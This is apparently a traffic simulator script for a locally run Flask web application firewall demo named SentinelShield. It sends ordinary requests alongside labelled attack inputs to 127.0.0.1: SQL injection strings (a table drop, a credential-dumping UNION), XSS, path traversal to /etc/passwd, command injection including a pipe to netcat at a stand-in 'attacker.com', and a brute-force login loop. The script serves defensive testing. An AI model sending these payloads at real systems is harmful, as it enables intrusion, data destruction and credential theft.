"""
SentinelShield - Traffic Simulator
Sends a realistic mix of normal and malicious HTTP requests against the
running Flask app (app.py must already be running on port 5000).

Usage:
    python app.py                 # terminal 1
    python simulate_traffic.py    # terminal 2
"""

import time
import requests

BASE = "http://127.0.0.1:5000"

# Simulate different "attacker" and "user" source IPs via header spoofing
NORMAL_IP = "10.0.0.15"
SQLI_IP = "203.0.113.24"
XSS_IP = "203.0.113.55"
LFI_IP = "198.51.100.9"
CMDI_IP = "198.51.100.42"
BRUTE_IP = "203.0.113.77"


def send(method, path, ip, params=None, data=None, label=""):
    headers = {"X-Forwarded-For": ip}
    try:
        if method == "GET":
            r = requests.get(BASE + path, params=params, headers=headers, timeout=3)
        else:
            r = requests.post(BASE + path, data=data, headers=headers, timeout=3)
        print(f"[{label:22s}] {method} {path} -> {r.status_code} {r.json().get('status', r.json().get('message',''))}")
    except Exception as e:
        print(f"[{label:22s}] ERROR: {e}")


def normal_traffic():
    send("GET", "/", NORMAL_IP, label="normal-home")
    send("GET", "/search", NORMAL_IP, params={"q": "cybersecurity certifications"}, label="normal-search")
    send("POST", "/login", NORMAL_IP, data={"username": "kaviepriya", "password": "hunter2"}, label="normal-login")
    send("GET", "/profile", NORMAL_IP, params={"file": "profile.txt"}, label="normal-profile")


def sqli_attacks():
    send("GET", "/search", SQLI_IP, params={"q": "' OR 1=1 --"}, label="sqli-tautology")
    send("GET", "/search", SQLI_IP, params={"q": "1 UNION SELECT username,password FROM users"}, label="sqli-union")
    send("GET", "/search", SQLI_IP, params={"q": "1; DROP TABLE users"}, label="sqli-droptable")
    send("GET", "/search", SQLI_IP, params={"q": "1 AND SLEEP(5)"}, label="sqli-sleep")


def xss_attacks():
    send("GET", "/search", XSS_IP, params={"q": "<script>alert(1)</script>"}, label="xss-script-tag")
    send("GET", "/search", XSS_IP, params={"q": "<img src=x onerror=alert(1)>"}, label="xss-onerror")
    send("GET", "/search", XSS_IP, params={"q": "javascript:alert(document.cookie)"}, label="xss-jsuri")


def lfi_traversal_attacks():
    send("GET", "/profile", LFI_IP, params={"file": "../../../../etc/passwd"}, label="lfi-etc-passwd")
    send("GET", "/profile", LFI_IP, params={"file": "..%2f..%2f..%2fboot.ini"}, label="traversal-encoded")


def cmdi_attacks():
    send("GET", "/run", CMDI_IP, params={"cmd": "ping 8.8.8.8; cat /etc/passwd"}, label="cmdi-chained")
    send("GET", "/run", CMDI_IP, params={"cmd": "ping 8.8.8.8 | nc attacker.com 4444"}, label="cmdi-piped")
    send("GET", "/run", CMDI_IP, params={"cmd": "echo `whoami`"}, label="cmdi-backtick")


def brute_force_attack():
    print("\n--- Simulating brute-force login (rapid repeated requests) ---")
    for i in range(15):
        send("POST", "/login", BRUTE_IP, data={"username": "admin", "password": f"guess{i}"}, label=f"bruteforce-#{i+1}")
        time.sleep(0.2)


if __name__ == "__main__":
    print("=== Phase 1: Normal traffic ===")
    normal_traffic()

    print("\n=== Phase 2: SQL Injection attempts ===")
    sqli_attacks()

    print("\n=== Phase 3: XSS attempts ===")
    xss_attacks()

    print("\n=== Phase 4: LFI / Directory Traversal attempts ===")
    lfi_traversal_attacks()

    print("\n=== Phase 5: Command Injection attempts ===")
    cmdi_attacks()

    print("\n=== Phase 6: Brute-force / rate-limit test ===")
    brute_force_attack()

    print("\nDone. View results at http://127.0.0.1:5000/dashboard")
    print("Log file: logs/waf_access.log.csv")
